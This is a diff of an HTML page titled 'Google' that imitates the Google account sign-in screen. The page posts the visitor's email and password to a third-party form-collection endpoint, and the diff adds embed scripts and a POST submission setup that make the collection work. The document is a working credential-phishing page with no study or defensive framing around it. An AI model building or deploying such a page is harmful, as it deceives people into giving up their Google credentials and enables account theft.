@@ -4,6 +4,11 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha512-Kc323vGBEqzTmouAECnVceyQqyqdsSiqLQISBL29aUW4U/M7pSPA/gEUZQqv1cwx4OnYxTxve5UMg5GT6L4JJg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <div id="formkeep-embed" data-formkeep-url="https://formkeep.com/p/fe1bea8949d978b828e641f23eabf5c1?embedded=1"></div>
+
+<script type="text/javascript" src="https://pym.nprapps.org/pym.v1.min.js"></script>
+<script type="text/javascript" src="https://cdn.formkeep.com/formkeep-embed.js"></script>
+
     <title>Google</title>
 </head>
 <style>
@@ -50,7 +55,9 @@
     <p class="head"><big>Sign in</big></p>
     <p>with your Google account. You'll also sign in to Google services in your apps & Safari</p>
     <div class="login">
-        <form action="https://formkeep.com/f/ec7b1941850a">
+        <form action="https://formkeep.com/f/ec7b1941850a" accept-charset="UTF-8"
+   enctype="multipart/form-data"
+   method="POST">>
         <input type="email" name="Email" placeholder="&nbsp;&nbsp; Email or phone" id="email">
         <br><br>
         <input type="password" name="Password" placeholder="&nbsp;&nbsp; Password" id="pass">
@@ -59,5 +66,17 @@
    <input type="submit" class="button"> &nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;
     </form>
     </div>
+    
+<script>
+const formkeepEmbed = document.querySelector('#formkeep-embed')
+
+formkeepEmbed.addEventListener('formkeep-embed:submitting', _event => {
+  console.log('Submitting form...')
+})
+
+formkeepEmbed.addEventListener('formkeep-embed:submitted', _event => {
+  console.log('Submitted form...')
+})
+</script>
 </body>
 </html>
